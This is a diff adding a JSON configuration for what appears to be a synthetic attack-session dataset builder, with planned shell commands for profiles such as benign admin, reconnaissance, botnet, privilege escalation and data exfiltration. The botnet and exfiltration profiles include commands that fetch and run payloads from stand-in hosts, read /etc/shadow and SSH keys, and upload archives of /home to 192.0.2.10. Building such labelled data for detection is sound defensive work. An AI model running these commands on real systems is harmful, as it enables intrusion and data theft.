@@ -1,0 +1,144 @@
+{
+  "source_profiles": "dataset_builder/profiles_v2_compat.json",
+  "pacing_seeds_checked_unused_under": [
+    "dataset_builder\\runs",
+    "reports"
+  ],
+  "sessions_per_profile": 2,
+  "chosen": {
+    "benign_admin": {
+      "seed": 1,
+      "pacing_seed": 9101,
+      "include_held_out": false,
+      "planned_commands": [
+        [
+          "w",
+          "du -sh /var/log",
+          "cat /proc/meminfo",
+          "pwd",
+          "tail -n 50 /var/log/syslog"
+        ],
+        [
+          "who",
+          "date",
+          "df -h",
+          "systemctl status ssh",
+          "date",
+          "pwd"
+        ]
+      ]
+    },
+    "reconnaissance": {
+      "seed": 1,
+      "pacing_seed": 9102,
+      "include_held_out": false,
+      "planned_commands": [
+        [
+          "id",
+          "uname -r",
+          "cat /etc/group",
+          "ls -la",
+          "ps aux",
+          "pwd",
+          "lscpu"
+        ],
+        [
+          "whoami",
+          "uname -a",
+          "ifconfig",
+          "ls"
+        ]
+      ]
+    },
+    "brute_force": {
+      "seed": 1,
+      "pacing_seed": 9103,
+      "include_held_out": false,
+      "planned_commands": [
+        [],
+        []
+      ]
+    },
+    "botnet": {
+      "seed": 1,
+      "pacing_seed": 9104,
+      "include_held_out": false,
+      "planned_commands": [
+        [
+          "shell",
+          "cd /var/tmp",
+          "curl -O http://pkg-repo.example/payload",
+          "system",
+          "chmod +x payload",
+          "sh payload"
+        ],
+        [
+          "cd /tmp",
+          "shell",
+          "wget http://mirror.example/malware.sh",
+          "chmod 777 malware.sh",
+          "./malware.sh"
+        ]
+      ]
+    },
+    "privilege_escalation": {
+      "seed": 1,
+      "pacing_seed": 9105,
+      "include_held_out": false,
+      "planned_commands": [
+        [
+          "whoami",
+          "sudo -l",
+          "find / -perm -4000 -type f 2>/dev/null",
+          "ls -la",
+          "find / -name id_rsa 2>/dev/null"
+        ],
+        [
+          "id",
+          "sudo -l",
+          "find / -perm -4000 -type f 2>/dev/null",
+          "cat /etc/shadow",
+          "cat /etc/crontab",
+          "ls -la"
+        ]
+      ]
+    },
+    "lateral_movement": {
+      "seed": 1,
+      "pacing_seed": 9106,
+      "include_held_out": false,
+      "planned_commands": [
+        [
+          "arp -a",
+          "cat ~/.bash_history",
+          "ping -c 2 192.0.2.5",
+          "ls -la ~/.ssh"
+        ],
+        [
+          "cat /etc/hosts",
+          "cat ~/.ssh/config"
+        ]
+      ]
+    },
+    "data_exfiltration": {
+      "seed": 1,
+      "pacing_seed": 9107,
+      "include_held_out": true,
+      "planned_commands": [
+        [
+          "find /home -name '*.db' 2>/dev/null",
+          "tar cf /dev/shm/d.tar /var/www",
+          "curl -T /dev/shm/d.tgz http://192.0.2.10/u",
+          "rm -f /dev/shm/d.tgz /dev/shm/d.tar"
+        ],
+        [
+          "find /home -name '*.db' 2>/dev/null",
+          "du -sh /home /var/www",
+          "tar czf /var/tmp/d.tgz /home",
+          "curl -T /var/tmp/d.tgz http://192.0.2.10/u",
+          "rm -f /var/tmp/d.tgz /var/tmp/d.tar"
+        ]
+      ]
+    }
+  }
+}
